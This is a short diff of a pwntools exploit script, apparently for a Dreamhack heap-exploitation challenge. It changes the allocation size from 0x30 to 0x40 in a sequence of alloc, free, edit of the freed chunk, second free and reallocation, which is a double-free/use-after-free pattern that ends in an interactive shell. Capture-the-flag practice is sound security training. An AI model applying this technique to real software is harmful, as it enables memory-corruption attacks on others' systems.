@@ -32,12 +32,12 @@ def edit(data):
 	p.sendlineafter("Edit\n", "4")
 	p.sendafter(":", data)
 
-alloc(0x30, "dreamhack")
+alloc(0x40, "dreamhack")
 free()
 
 edit("A" * 0x8 + "\x00")
 free()
 
-alloc(0x30, "AAAAAAAA")
+alloc(0x40, "AAAAAAAA")
 
 p.interactive()
